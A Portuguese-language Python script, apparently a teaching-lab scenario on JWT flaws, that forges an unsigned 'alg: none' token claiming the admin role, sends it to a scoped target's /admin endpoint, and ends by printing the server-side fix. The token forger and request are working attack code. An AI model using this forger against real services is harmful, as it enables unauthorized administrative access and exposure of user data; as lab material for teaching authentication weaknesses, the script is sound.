"""
CENÁRIO 04 · Falhas de JWT — segredo fraco e algoritmo 'none'
Autenticação / Criptografia (assinatura digital) · CIA: Autenticidade.

Dois problemas clássicos:
  (a) O servidor assina com segredo fraco ("123456"), quebrável por dicionário.
  (b) O servidor aceita tokens com "alg":"none" (sem assinatura). O atacante
      forja um token dizendo papel=admin e entra no /admin.
Liga com a aula: um JWT é um conteúdo + uma assinatura. Se a assinatura não é
verificada de verdade, a identidade não está provada (como um certificado sem CA).
"""
import base64
import json
from config import checar_escopo, titulo, sessao

ALVO = checar_escopo()


def b64url(dados: bytes) -> str:
    return base64.urlsafe_b64encode(dados).rstrip(b"=").decode()


def forjar_token_none(payload: dict) -> str:
    # Cabeçalho com alg=none e assinatura vazia (3ª parte em branco):
    cabecalho = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    corpo = b64url(json.dumps(payload).encode())
    return f"{cabecalho}.{corpo}."


def main():
    titulo("04", "JWT alg:none + segredo fraco", "Autenticação / Criptografia")

    print("\n(1) Acesso ao /admin sem token — deve ser negado:")
    r = sessao.get(f"{ALVO}/admin")
    print(f"  HTTP {r.status_code} -> {r.text[:80]}")

    print("\n(2) Forjando token com alg:none e papel=admin (sem saber o segredo):")
    token = forjar_token_none({"usuario": "intruso", "papel": "admin"})
    print(f"  token forjado: {token}")
    r = sessao.get(f"{ALVO}/admin", headers={"Authorization": f"Bearer {token}"})
    print(f"  HTTP {r.status_code}")
    if r.status_code == 200:
        dados = r.json()
        print(f"  ACESSO CONCEDIDO — vazou {len(dados['usuarios'])} usuários do painel admin.")
    else:
        print(f"  resposta: {r.text[:80]}")

    print("\nCORREÇÃO: no servidor, fixar algorithms=['HS256'], recusar 'none', e usar")
    print("          segredo longo e aleatório (ou chaves assimétricas RS256/ES256).")


if __name__ == "__main__":
    main()
